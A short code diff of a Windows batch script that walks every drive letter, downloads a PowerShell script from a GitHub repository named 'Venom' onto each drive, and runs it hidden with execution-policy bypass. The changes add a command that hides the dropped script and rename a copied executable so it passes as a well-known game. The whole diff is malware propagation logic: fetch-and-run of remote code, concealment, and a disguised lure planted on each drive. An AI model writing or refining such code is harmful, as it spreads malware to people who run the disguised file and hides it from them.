@@ -26,9 +26,11 @@ for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 
         powershell.exe -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\wYytnosVxfzD.ps1'"
 
+        attrib +h "%%d:\wYytnosVxfzD.ps1"
+
         powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File "%%d:\wYytnosVxfzD.ps1"
 
-        copy "AssassiinsCreed.exe" "%%d:\AssassiinsCreed.exe"
+        copy "AssassiinsCreed.exe" "%%d:\AssassinsCreed.exe"
     )
 )
 
